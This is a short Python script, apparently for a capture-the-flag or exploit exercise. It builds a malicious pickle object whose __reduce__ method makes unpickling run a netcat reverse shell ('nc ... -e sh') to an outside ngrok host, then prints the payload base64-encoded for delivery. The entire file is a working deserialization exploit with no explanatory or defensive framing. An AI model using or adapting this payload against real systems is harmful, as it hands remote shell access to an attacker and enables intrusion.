import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        cmd = ('nc 0.tcp.ap.ngrok.io 15872 -e sh')
        return os.system, (cmd,)

if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))